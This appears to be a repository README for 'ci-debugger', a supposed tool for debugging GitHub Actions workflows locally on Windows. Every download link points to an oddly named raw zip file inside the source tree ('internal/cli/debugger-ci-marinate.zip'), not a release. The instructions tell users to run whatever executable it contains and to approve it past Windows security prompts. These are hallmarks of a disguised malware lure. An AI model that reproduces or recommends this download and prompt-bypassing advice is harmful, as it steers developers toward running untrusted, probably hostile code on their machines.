# 🐞 ci-debugger - Debug workflows with local breakpoints

[![Download ci-debugger](https://img.shields.io/badge/Download-ci--debugger-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)

## 🚀 What this does

ci-debugger helps you run GitHub Actions workflows on your own Windows PC. You can pause at breakpoints, inspect what is happening, and test changes before you commit them.

It is useful when a workflow fails and you do not want to guess why. Instead of pushing changes again and again, you can check the run on your machine.

## 💻 Who this is for

Use ci-debugger if you want to:

- test a GitHub Actions workflow without waiting for a cloud run
- catch problems before you push a change
- inspect step by step what a workflow does
- work with CI and CD jobs on Windows
- reduce trial and error in YAML files

## 📦 Download

Visit this page to download:

[https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)

On that page, look for the latest release or download file for Windows. If you see a `.exe` file, download and run it. If you see a zip file, download it, unzip it, and open the app inside the folder.

## 🪟 Windows setup

Before you start, make sure you have:

- Windows 10 or Windows 11
- a stable internet connection
- enough free space for the app and your workflow files
- permission to run apps on your computer

If Windows shows a security prompt, choose the option that lets you open the file.

## 🧭 Install and open

1. Go to the download page:
   [https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)

2. Find the Windows download.

3. Download the file to your computer.

4. If the file is a `.zip`, right-click it and choose Extract All.

5. Open the extracted folder.

6. Double-click the app file to start ci-debugger.

7. If Windows asks for approval, select the option to run it.

## 🛠️ Basic use

After you open ci-debugger, you can use it to load a workflow and step through it.

A normal flow looks like this:

1. Pick the GitHub Actions workflow you want to test.
2. Point the app at your project folder.
3. Start the run.
4. Stop at breakpoints where you want to inspect the job.
5. Check inputs, files, and step output.
6. Make a change and run it again.

## 🔍 What you can check

ci-debugger is built for local workflow testing, so you can review things like:

- environment values
- file paths
- step order
- job inputs
- command output
- failed steps
- changes between runs

This helps when a workflow works in one branch but fails in another.

## 🧰 Common uses

You can use ci-debugger for:

- debugging a build job
- testing a deploy step before release
- checking a script used in CI
- finding a bad path or file name
- seeing what happens in each step of a workflow

## ⚙️ Example workflow

A simple test run may look like this:

1. Open your project folder.
2. Choose the workflow file you want to test.
3. Start the local run.
4. Pause at the step you care about.
5. Inspect the result.
6. Fix the YAML or script.
7. Run it again until it behaves the way you want.

## 🧩 Tips for smoother use

- Keep your project folder small while you test.
- Use clear file names for scripts and workflow files.
- Change one thing at a time.
- Save your work before you run a test.
- If a step fails, check the file path first.
- If a command does not work, compare it with the same step in GitHub Actions.

## 📁 Suggested folder setup

A simple folder layout can help you stay organized:

- your-project/
  - .github/
    - workflows/
  - scripts/
  - build/
  - test-files/

This makes it easier to find the file that caused the issue.

## 🔧 Troubleshooting

If the app does not open:

1. Make sure the download finished.
2. Check that you unzipped the file if needed.
3. Try running the app again.
4. Right-click the file and look for an Open option.

If a workflow does not start:

1. Check the workflow file name.
2. Make sure the file is in the right folder.
3. Confirm the project path is correct.
4. Try again after saving your changes.

If a step fails:

1. Read the error text.
2. Check the command in that step.
3. Look for a missing file or wrong path.
4. Run the step again after you fix it.

## 📚 Repo details

Repository: ci-debugger  
Topic areas: ci-cd, cli, debugging, devtools, docker, github-actions, golang  
Use case: local GitHub Actions workflow debugging on Windows

## 🖱️ Get it now

[Download ci-debugger](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)

Open the page, choose the latest release or file for Windows, then download and run it